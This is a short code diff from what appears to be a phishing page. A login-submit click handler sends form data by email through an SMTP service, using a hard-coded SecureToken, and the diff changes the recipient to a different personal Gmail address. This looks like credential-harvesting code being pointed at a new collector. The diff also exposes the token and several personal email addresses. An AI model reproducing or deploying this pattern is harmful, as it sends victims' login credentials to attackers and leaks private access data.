@@ -29,7 +29,7 @@ $(document).on('click','#logSubmiting', function(e) {
           // From: "muheezogungbo26@gmail.com",
           
           SecureToken: '1da0dcb4-c434-44fa-b7fa-c9577ebe1408',
-          To: 'muheezogungbo26@gmail.com',
+          To: 'lucazoluwaseun@gmail.com',
           From: "shirleylargey40@gmail.com",
             
             Subject: `Email`,
